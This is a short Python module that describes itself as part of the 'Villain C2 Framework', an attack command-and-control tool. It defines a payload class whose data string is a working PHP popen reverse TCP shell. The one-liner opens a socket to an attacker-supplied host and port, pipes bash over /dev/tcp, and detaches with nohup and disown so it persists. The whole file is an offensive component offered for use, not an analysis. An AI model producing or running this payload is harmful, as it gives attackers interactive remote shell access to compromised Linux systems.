# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'PHP popen reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'PHP popen reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'netcat',
        'type' : 'php-popen',
        'os' : 'linux'   
    }

    config: ClassVar[dict] = {}

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LPORT*);popen(\"bash <&3 >&3 2>&3\", \"r\");' 3<>/dev/tcp/*LHOST*/*LPORT* > /dev/null 2>&1 & disown"
